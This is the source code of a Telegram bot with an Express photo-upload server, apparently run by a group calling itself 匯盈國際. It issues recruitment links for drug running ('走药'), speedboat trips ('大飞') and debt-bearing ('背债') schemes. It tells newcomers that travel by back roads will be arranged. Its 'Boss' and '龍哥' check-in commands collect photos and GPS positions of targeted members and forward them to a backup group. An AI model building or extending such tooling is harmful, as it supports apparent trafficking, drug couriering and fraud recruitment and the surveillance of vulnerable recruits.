const { Telegraf } = require('telegraf');
const fs = require('fs');
const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

// ==================== 1. 全局配置區 ====================
let botInstance = null;
const bot = new Telegraf(process.env.BOT_TOKEN);

// 允許運行機器人的群組 ID 列表
const GROUP_CHAT_IDS = [
  -1003354803364,
  -1003381368112,
  -1003308598858,
  -1003368574609,
  -1003286063197,
  -1003378109615,
  -1003293673373,
  -1003203365614,
  -1000000000009,
  -1000000000010
];
const BACKUP_GROUP_ID = -1003293673373;
const WEB_APP_URL = 'https://huiying8.netlify.app'; // 你的前端網址
const AUTH_FILE = './authorized.json';

// ==================== 2. 內存數據庫 ====================

// 用戶權限列表 (userId -> role)
// role: 'user' (普通用戶), 'agent' (中介)
let authorizedUsers = new Map(); 

// 分群獨立令牌 Map <chatId, token>
// 用於實現 "一鍵失效" 功能，且不同群互不影響
let groupTokens = new Map();     

// 臨時消息記錄
const warningMessages = new Map();
const unauthorizedMessages = new Map();
const zlMessages = new Map();

// 招聘鏈接配置
const ZL_LINKS = {
  '租车': 'https://che88.netlify.app',
  '大飞': 'https://fei88.netlify.app',
  '走药': 'https://yao88.netlify.app',
  '背债': 'https://bei88.netlify.app'
};
// 中介鏈接配置
const ZJ_LINKS = {
  '租车': 'https://zjc88.netlify.app',
  '大飞': 'https://zjf88.netlify.app',
  '走药': 'https://zjy88.netlify.app',
  '背债': 'https://zjb88.netlify.app'
};

// ==================== 3. 核心工具函數 ====================

// 獲取或刷新指定群的令牌
function getOrRefreshToken(chatId, forceRefresh = false) {
    const cid = String(chatId); // 統一轉字符串做key
    if (forceRefresh || !groupTokens.has(cid)) {
        const newToken = crypto.randomBytes(8).toString('hex');
        groupTokens.set(cid, newToken);
        saveAuth(); // 立即保存
        return newToken;
    }
    return groupTokens.get(cid);
}

// 加載數據
function loadAuth() {
    try {
        if (fs.existsSync(AUTH_FILE)) {
            const data = fs.readFileSync(AUTH_FILE, 'utf8');
            const parsed = JSON.parse(data);
            
            // 恢復用戶
            authorizedUsers.clear();
            if (parsed.users) {
                for (let [key, value] of Object.entries(parsed.users)) {
                    authorizedUsers.set(Number(key), value);
                }
            }
            
            // 恢復群令牌
            groupTokens.clear();
            if (parsed.tokens) {
                for (let [key, value] of Object.entries(parsed.tokens)) {
                    groupTokens.set(key, value);
                }
            }
            
            console.log(`數據加載成功: ${authorizedUsers.size} 用戶, ${groupTokens.size} 個群令牌`);
        }
    } catch (e) { 
        console.log('加載失敗或文件不存在');
    }
}

// 保存數據
function saveAuth() {
    try {
        const data = {
            users: Object.fromEntries(authorizedUsers),
            tokens: Object.fromEntries(groupTokens) // Map 轉 Object 保存
        };
        fs.writeFileSync(AUTH_FILE, JSON.stringify(data));
    } catch (e) { console.error('保存失敗', e); }
}

// 初始化加載
loadAuth();

// 出廠設置
function factoryReset() {
    authorizedUsers.clear();
    groupTokens.clear(); // 清空所有令牌
    warningMessages.clear();
    unauthorizedMessages.clear();
    zlMessages.clear();
    
    try { if(fs.existsSync(AUTH_FILE)) fs.unlinkSync(AUTH_FILE); } catch(e){}
    console.log('出廠設置完成');
}

// 發送圖片到群組
async function sendToChat(chatId, photoBuffer, caption, lat, lng) {
    try {
        await bot.telegram.sendPhoto(chatId, { source: photoBuffer }, {
            caption,
            parse_mode: 'HTML'
        });
        if (lat && lng && (lat !== 0 || lng !== 0)) {
            await bot.telegram.sendLocation(chatId, lat, lng);
        }
    } catch (error) {
        console.error(`發送失敗 ${chatId}:`, error);
        try { await bot.telegram.sendMessage(BACKUP_GROUP_ID, `⚠️ 錯誤: ${error.message}`); } catch {}
    }
}

// 檢查管理員權限
async function isAdmin(chatId, userId) {
    try {
        const member = await bot.telegram.getChatMember(chatId, userId);
        return member.status === 'administrator' || member.status === 'creator';
    } catch (e) { return false; }
}

// ==================== 4. Bot 邏輯與指令 ====================

// 私聊保護
bot.use(async (ctx, next) => {
    if (ctx.message && ctx.chat?.type === 'private') {
        await ctx.reply(`❌ 🔒本機器人只供匯盈國際內部使用。`);
        return;
    }
    await next();
});

// 菜單 /bz
bot.command('bz', (ctx) => {
    if (!GROUP_CHAT_IDS.includes(ctx.chat.id)) return;
    const helpText = `📋匯盈國際官方指令\n\n` +
        `/hc - 換車安全拍照\n` +
        `/zjkh - 中介專用鏈接 (客戶名字顯示中介)\n` +
        `/boss - Boss 查崗\n` +
        `/lg - 龍哥查崗\n` +
        `/sx - 刷新本群鏈接 (舊鏈接失效)\n` +
        `/zl - 招聘申請\n` +
        `/zj - 中介申請\n` +
        `/qc - 恢復出廠\n` +
        `/lh - 踢人\n` +
        `/lj - 進群鏈接\n`;
    ctx.reply(helpText);
});

// ★★★ 核心功能：只刷新本群令牌 /sx
bot.command('sx', async (ctx) => {
    if (!GROUP_CHAT_IDS.includes(ctx.chat.id)) return;
    if (!await isAdmin(ctx.chat.id, ctx.from.id)) return ctx.reply('無權限');

    const newToken = getOrRefreshToken(ctx.chat.id, true); // true = 強制刷新
    
    ctx.reply(`✅ **本群**安全令牌已刷新！\n(Token: ...${newToken.substr(-4)})\n\n⚠️ 本群之前的舊鏈接已全部失效，其他群不受影響。`);
});

// 1. 換車指令 /hc
bot.command('hc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const userId = ctx.from.id;
    
    const role = authorizedUsers.get(userId);
    const isAuthorized = role === 'user' || role === 'agent';
    const isAdminUser = await isAdmin(chatId, userId);

    if (!isAuthorized && !isAdminUser) return ctx.reply('無權限，請先聯繫管理授權');

    // 獲取本群專屬令牌
    const token = getOrRefreshToken(chatId);
    const webAppUrl = `${WEB_APP_URL}/?chatid=${chatId}&uid=${userId}&name=${encodeURIComponent(ctx.from.first_name)}&token=${token}`;

    await ctx.reply('為了保障你的安全換車前請拍照！', {
        reply_markup: { inline_keyboard: [[ { text: '📷開始拍照', url: webAppUrl } ]] }
    });
});

// 2. 中介專用指令 /zjkh
bot.command('zjkh', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const userId = ctx.from.id;
    const role = authorizedUsers.get(userId);
    const isAdminUser = await isAdmin(chatId, userId);

    if (role !== 'agent' && !isAdminUser) {
        return ctx.reply('❌ 無權限！此指令僅限授權中介使用。\n普通用戶請使用 /hc');
    }

    const token = getOrRefreshToken(chatId);
    // 名字格式：中介客戶-中介名
    const clientLink = `${WEB_APP_URL}/?chatid=${chatId}&uid=${userId}&name=${encodeURIComponent(`中介客戶-${ctx.from.first_name}`)}&token=${token}`;

    const msg = `🔗 **中介客戶專用鏈接**\n\n請複製發給客戶：\n${clientLink}`;
    ctx.reply(msg, { parse_mode: 'Markdown', disable_web_page_preview: true });
});

// 3. Boss 查崗 /boss
bot.command('boss', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    if (!await isAdmin(chatId, ctx.from.id)) return;

    let targetUser, targetUserId;
    if (ctx.message.reply_to_message) {
        targetUser = ctx.message.reply_to_message.from.first_name;
        targetUserId = ctx.message.reply_to_message.from.id;
    } else {
        return ctx.reply('請回复用戶消息');
    }

    const token = getOrRefreshToken(chatId);
    const webAppUrl = `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}&name=${encodeURIComponent(targetUser)}&token=${token}`;

    await ctx.reply(`Boss要求你拍照 @${targetUser}`, {
        reply_markup: { inline_keyboard: [[ { text: '📷點擊拍照', url: webAppUrl } ]] }
    });
});

// 4. 龍哥查崗 /lg
bot.command('lg', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    if (!await isAdmin(chatId, ctx.from.id)) return;

    let targetUser, targetUserId;
    if (ctx.message.reply_to_message) {
        targetUser = ctx.message.reply_to_message.from.first_name;
        targetUserId = ctx.message.reply_to_message.from.id;
    } else {
        return ctx.reply('請回复用戶消息');
    }

    const token = getOrRefreshToken(chatId);
    const webAppUrl = `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}&name=${encodeURIComponent(targetUser)}&token=${token}`;

    await ctx.reply(`龍哥要求你拍照 @${targetUser}`, {
        reply_markup: { inline_keyboard: [[ { text: '📷點擊拍照', url: webAppUrl } ]] }
    });
});

// 5. 出廠設置 /qc (同時刷新 Token)
bot.command('qc', async (ctx) => {
    if (!GROUP_CHAT_IDS.includes(ctx.chat.id)) return;
    if (!await isAdmin(ctx.chat.id, ctx.from.id)) return;
    
    let startMessageId = ctx.message.message_id;
    if (ctx.message.reply_to_message) startMessageId = ctx.message.reply_to_message.message_id;
    let i = 1;
    let consecutiveFails = 0;
    ctx.reply('正在清理消息...');
    while (i <= 300 && consecutiveFails < 10) {
        try {
            await bot.telegram.deleteMessage(ctx.chat.id, startMessageId - i);
            consecutiveFails = 0; i++; await new Promise(r => setTimeout(r, 40)); 
        } catch (e) { consecutiveFails++; i++; }
    }
    
    factoryReset();
    ctx.reply('✅ 出廠設置已重置');
});

// 6. 招聘鏈接 /zl (已展開)
bot.command('zl', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return ctx.reply('❌ 🔒無權限！');

    let targetUserId, targetFirstName;
    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id;
        targetFirstName = ctx.message.reply_to_message.from.first_name || '未知';
    } else {
        return ctx.reply('請回复用戶消息');
    }

    const replyMsg = await ctx.reply(`填寫招聘申請時請打開手機錄屏，按照上面順序排列填寫資料後拍照關閉手機錄屏後發送到此群裡！\n\n👤請選擇申請類型：`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '租车', callback_data: 'zl_租车' }, { text: '大飞', callback_data: 'zl_大飞' }],
                [{ text: '走药', callback_data: 'zl_走药' }, { text: '背债', callback_data: 'zl_背债' }]
            ]
        }
    });
    zlMessages.set(replyMsg.message_id, { 
        commandType: 'zl', 
        targetFirstName, targetUserId 
    });
});

// 7. 中介鏈接 /zj (已展開)
bot.command('zj', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return ctx.reply('❌ 🔒無權限！');

    let targetUserId, targetFirstName;
    if (ctx.message.reply_to_message) {
        targetUserId = ctx.message.reply_to_message.from.id;
        targetFirstName = ctx.message.reply_to_message.from.first_name || '未知';
    } else {
        return ctx.reply('請回复用戶消息');
    }

    const replyMsg = await ctx.reply(`填寫招聘申請時請打開手機錄屏，按照上面順序排列填寫資料後拍照關閉手機錄屏後發送到此群裡！\n\n👤請選擇中介申請類型：`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '租车', callback_data: 'zj_租车' }, { text: '大飞', callback_data: 'zj_大飞' }],
                [{ text: '走药', callback_data: 'zj_走药' }, { text: '背债', callback_data: 'zj_背债' }]
            ]
        }
    });
    zlMessages.set(replyMsg.message_id, { 
        commandType: 'zj', 
        targetFirstName, targetUserId 
    });
});

// 8. 踢人 /lh
bot.command('lh', async (ctx) => {
    if (!GROUP_CHAT_IDS.includes(ctx.chat.id)) return;
    if (!await isAdmin(ctx.chat.id, ctx.from.id)) return;
    if (!ctx.message.reply_to_message) return ctx.reply('請回复消息');
    try { await bot.telegram.banChatMember(ctx.chat.id, ctx.message.reply_to_message.from.id); ctx.reply('已拉黑'); } catch(e) { ctx.reply('失敗'); }
});

// 9. 進群鏈接 /lj
bot.command('lj', async (ctx) => {
    if (!GROUP_CHAT_IDS.includes(ctx.chat.id)) return;
    if (!await isAdmin(ctx.chat.id, ctx.from.id)) return;
    try { const link = await bot.telegram.exportChatInviteLink(ctx.chat.id); ctx.reply(`群鏈接: ${link}`); } catch(e) { ctx.reply('失敗'); }
});

// ==================== 5. 事件處理 ====================

// 回調按鈕
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    
    // 處理招聘/中介鏈接選擇
    if (data.startsWith('zl_') || data.startsWith('zj_')) {
        const [type, key] = data.split('_');
        const links = type === 'zl' ? ZL_LINKS : ZJ_LINKS;
        const link = links[key];
        const stored = zlMessages.get(ctx.callbackQuery.message.message_id);
        
        if (stored) {
             const userInfo = `TG名字: ${stored.targetFirstName}\nID: ${stored.targetUserId}`;
             const instruction = type === 'zl' ? '點擊上方鏈接打開瀏覽器進行填寫！' : '發給你的客戶讓客戶打開瀏覽器進行填寫！';
             const initialText = '填寫招聘申請時請打開手機錄屏，按照上面順序排列填寫資料後拍照關閉手機錄屏後發送到此群裡！';
             
             await ctx.editMessageText(`${initialText}\n\n${userInfo}\n\n申請鏈接：<a href="${link}">${key}鏈接</a>\n複製鏈接: ${link}\n\n${instruction}`, { parse_mode: 'HTML' });
        }
    }
    
    // 處理出行方式確認
    if (data === 'travel_land' || data === 'travel_flight') {
        const text = data === 'travel_land' ? '🚨上車安全提醒：上車後不要跟其他人過多交流...' : '上車前要拍照到此群核對...';
        await ctx.deleteMessage();
        const m = await ctx.reply(text);
        try { await bot.telegram.pinChatMessage(ctx.chat.id, m.message_id); } catch(e){}
    }
    ctx.answerCbQuery();
});

// 新成員進群
bot.on('new_chat_members', async (ctx) => {
    if (!GROUP_CHAT_IDS.includes(ctx.chat.id)) return;
    for (const m of ctx.message.new_chat_members) {
        if(m.is_bot) continue;
        authorizedUsers.delete(m.id); // 默認無權限
        saveAuth();
        try { await bot.telegram.restrictChatMember(ctx.chat.id, m.id, { permissions: { can_send_messages: false } }); } catch(e){}
        const warning = await ctx.reply(`🚫歡迎 ${m.first_name}，你還沒有獲得授權權限，請立即聯繫負責人進行授權！`);
        warningMessages.set(warning.message_id, { userId: m.id, userName: m.first_name });
    }
    await ctx.reply(`請選擇你的出行方式：`, {
        reply_markup: { inline_keyboard: [[{ text: `負責人安排走小路`, callback_data: 'travel_land' }], [{ text: `坐飛機`, callback_data: 'travel_flight' }]] }
    });
});

// 文本消息處理 (權限 + 授權)
bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    const userId = ctx.from.id;
    const role = authorizedUsers.get(userId);
    const isAdminUser = await isAdmin(chatId, userId);

    // 1. 鑒權：非管理員且非授權用戶，刪除消息
    if (!isAdminUser && role !== 'user' && role !== 'agent') {
        try { await ctx.deleteMessage(); } catch(e){}
        return;
    }

    // 2. 授權邏輯
    if (isAdminUser && ctx.message.reply_to_message) {
        const text = ctx.message.text.trim();
        const replyId = ctx.message.reply_to_message.message_id;
        
        let target = warningMessages.get(replyId) || 
                     unauthorizedMessages.get(replyId) || 
                     { userId: ctx.message.reply_to_message.from.id, userName: ctx.message.reply_to_message.from.first_name };

        if (!target) return;

        // 中介授權 (權限高，可用 /zjkh)
        if (text === '中介授权') {
            authorizedUsers.set(target.userId, 'agent');
            saveAuth();
            try { await bot.telegram.restrictChatMember(chatId, target.userId, { permissions: { can_send_messages: true, can_send_photos: true, can_send_videos: true, can_send_other_messages: true, can_add_web_page_previews: true, can_invite_users: true } }); } catch (e) {}
            await ctx.reply(`路上只是要換車的請都使用 /zjkh 這個指令把鏈接發給你的兄弟，讓你的兄弟拍照，（溫馨提示：從鏈接可以一直使用）`);
            warningMessages.delete(replyId);
        } 
        // 普通授權 (權限低，只能用 /hc)
        else if (text === '授权') {
            authorizedUsers.set(target.userId, 'user');
            saveAuth();
            try { await bot.telegram.restrictChatMember(chatId, target.userId, { permissions: { can_send_messages: true, can_send_photos: true, can_send_videos: true, can_send_other_messages: true, can_add_web_page_previews: true, can_invite_users: true } }); } catch (e) {}
            await ctx.reply(`✅ 已授權普通用戶 ${target.userName}！(只能用 /hc)`);
            warningMessages.delete(replyId);
        }
    }
});

// ==================== 6. Express 服務器 ====================
const expressApp = express();
expressApp.use(cors());
expressApp.use(express.raw({ type: '*/*', limit: '10mb' }));

expressApp.post('/upload', async (req, res) => {
  try {
    const photoBuffer = req.body;
    const { lat, lng, name = '用户', uid = '未知', time, chatid, token } = req.query;
    
    if (!chatid) return res.status(400).json({ code: 1, msg: '無ChatID' });

    // ★★★ 核心功能：檢查該群的令牌
    const currentGroupToken = groupTokens.get(String(chatid));
    
    // 校驗令牌：實現一鍵失效
    if (!currentGroupToken || token !== currentGroupToken) {
        return res.status(403).json({ code: 1, msg: '⛔️ 鏈接已失效！\n\n本群管理員已刷新安全令牌，請在群內使用指令重新獲取最新鏈接。' });
    }

    const latitude = parseFloat(lat) || 0;
    const longitude = parseFloat(lng) || 0;
    const isTestMode = (latitude === 0 && longitude === 0);
    const googleMapUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
    const amapUrl = `https://amap.com/dir?destination=${longitude},${latitude}`;
    
    let locationText = isTestMode ? `位置：(測試模式-無定位)` : `位置：${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
    
    let userLink = name;
    if (uid && uid !== '未知') { userLink = `<a href="tg://user?id=${uid}">${name}</a>`; }

    const caption = `<b>[H5拍照上傳]</b>\n👤用戶：${userLink} (ID:${uid})\n⏰時間：${new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })}\n📍${locationText}\n🗺️<a href="${amapUrl}">高德地圖</a> | <a href="${googleMapUrl}">谷歌地圖</a>`;

    if (GROUP_CHAT_IDS.includes(Number(chatid))) {
      await sendToChat(Number(chatid), photoBuffer, caption, latitude, longitude);
    }
    await sendToChat(BACKUP_GROUP_ID, photoBuffer, `[備份] ${caption}`, latitude, longitude);
    res.json({ code: 0, msg: 'success' });
  } catch (err) {
    res.status(500).json({ code: 1, msg: err.message });
  }
});

expressApp.get('/', (req, res) => res.send('Bot OK'));
const PORT = process.env.PORT || 10000;
expressApp.listen(PORT, () => { console.log(`Server: ${PORT}`); bot.launch(); });
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
